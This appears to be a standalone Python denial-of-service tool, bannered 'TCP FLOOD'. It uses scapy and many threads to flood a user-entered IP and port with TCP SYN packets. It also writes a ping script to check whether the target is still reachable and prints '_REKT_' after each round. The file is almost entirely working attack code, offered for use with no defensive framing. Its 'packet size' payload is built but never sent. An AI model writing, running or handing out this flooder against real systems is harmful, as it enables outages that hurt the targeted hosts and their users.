import os 
import threading
from scapy.all import * 

def send_syn(TCP_IP, TCP_PORT, packet_size):
    payload_size = (packet_size)
    payload = b'X' * payload_size 
    ip = IP(dst=TCP_IP)
    tcp = TCP(dport=TCP_PORT, flags='S')
    packet = ip/tcp
    send(packet, verbose=0)

def makebash(ip_address):
    bash_script_name = "ping.sh"
    bash_script_content = f"""#!/bin/bash
while true; do
    ping -c 1 {ip_address}
    sleep 3
done
"""
    
    with open(bash_script_name, 'w') as bash_file:
        bash_file.write(bash_script_content)
    os.chmod(bash_script_name, 0o755)
    print(color_red(f"Bash script '{bash_script_name}' created to ping {ip_address}."))

def execute_bash_script():
    os.system('./ping.sh')

def color_red(text):
    RED = "\033[91m" 
    RESET = "\033[0m" 
    return f"{RED}{text}{RESET}" 

def color_white(text):
    WHITE = "\u001b[37m"
    RESET = "\033[0m"
    return f"{WHITE}{text}{RESET}"

def color_yellow(text):
    YELLOW = "\033[0;33m" 
    RESET = "\033[0m"
    return f"{YELLOW}{text}{RESET}"

def create_message(size):
    return b'X' * size 


def start_threads(TCP_IP, TCP_PORT, packet_size, thread_count):
    threads = []
    for T in range(thread_count):
        thread = threading.Thread(target=send_syn, args=(TCP_IP, TCP_PORT, packet_size))
        threads.append(thread)
        thread.start()
    for thread in threads:
        thread.join()


print(color_red("""                                
  _______ _____ _____    ______ _      ____   ____  _____  
 |__   __/ ____|  __ \  |  ____| |    / __ \ / __ \|  __ \ 
    | | | |    | |__) | | |__  | |   | |  | | |  | | |  | |
    | | | |    |  ___/  |  __| | |   | |  | | |  | | |  | |
    | | | |____| |      | |    | |___| |__| | |__| | |__| |
    |_|  \_____|_|      |_|    |______\____/ \____/|_____/ 
                                                                                                   
"""))

TCP_IP = input(color_red("Enter the target IP address: "))
TCP_PORT = int(input(color_red("Enter the target port number: ")))
packet_size = int(input(color_red("Enter packet size in bytes (1-1460):")))
amount = int(input(color_red("Number of packets to send:")))
print(color_yellow("File to monitor ping of " + TCP_IP + " will be created. Run ./FLOOD/ping.sh in a seperate terminal after flood has been initialized."))
thread_count = int(input(color_red("Enter the number of threads: ")))

user_ip = TCP_IP
    
makebash(user_ip)
    
for i in range(amount):
    start_threads(TCP_IP, TCP_PORT, packet_size, thread_count)
    print(color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}") + color_red("_REKT_") + color_yellow(f"{i + 1}"))

print("~DONE~") 




